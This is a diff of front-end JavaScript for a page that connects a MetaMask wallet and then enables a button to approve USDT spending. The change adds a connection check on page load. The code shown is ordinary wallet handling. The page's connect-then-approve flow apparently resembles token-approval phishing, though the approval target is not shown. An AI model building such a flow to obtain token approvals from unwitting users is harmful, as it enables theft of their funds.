@@ -47,20 +47,32 @@ const usdtABI = [
 let web3;
 let userAccount;
 
-document.getElementById('connectButton').onclick = async () => {
+async function checkConnection() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        if (accounts.length > 0) {
+            userAccount = accounts[0];
+            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
+            document.getElementById('approveButton').disabled = false; // 启用授权按钮
+        } else {
+            document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
+        }
+    }
+}
+
+document.getElementById('connectButton').onclick = async () => {
+    if (window.ethereum) {
         // 在请求账户之前，直接更新按钮文本
         document.getElementById('connectButton').innerText = '连接中...';
         try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAccount = accounts[0]; // 获取第一个账户
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAccount = (await web3.eth.getAccounts())[0]; // 获取第一个账户
             console.log('钱包连接成功: ', userAccount);
             document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
             document.getElementById('approveButton').disabled = false; // 启用授权按钮
         } catch (error) {
             console.error('连接错误: ', error);
-            // 只在连接失败时显示错误信息
             document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
             if (error.code === 4001) {
                 alert('连接钱包请求被拒绝');
@@ -72,6 +84,9 @@ document.getElementById('connectButton').onclick = async () => {
         alert('请安装 MetaMask!');
     }
 };
+
+// 在页面加载时检查连接状态
+window.addEventListener('load', checkConnection);
 
 document.getElementById('approveButton').onclick = async () => {
     const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
